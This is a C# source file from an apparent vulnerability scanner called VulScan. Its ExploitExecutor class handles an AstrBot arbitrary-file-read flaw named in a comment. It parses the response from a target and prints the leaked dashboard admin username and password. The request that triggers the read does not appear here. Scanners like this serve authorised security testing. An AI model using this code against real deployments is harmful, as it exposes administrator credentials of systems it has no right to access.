using System.Text.Json;
using VulScan.Utilities;

namespace VulScan.Core;

public class ExploitExecutor
{
    /// <summary>
    /// 针对指定漏洞的利用
    /// </summary>
    public static void VulExploit(string vulName, string requestBody, string responseBody)
    {
        DashBoardModel? dashBoardModel = JsonSerializer.Deserialize<DashBoardModel>(responseBody);
        if (dashBoardModel != null)
        {
            ColorUtility.PrintColored($"username: {dashBoardModel.dashboard.username}, password: {dashBoardModel.dashboard.password}",  ColorType.Red);
        }
    }
}

// AstrBot任意文件读取漏洞
class Dashboard
{
    public string username { get; set; }
    public string password { get; set; }
}

class DashBoardModel
{
    public Dashboard dashboard { get; set; }
}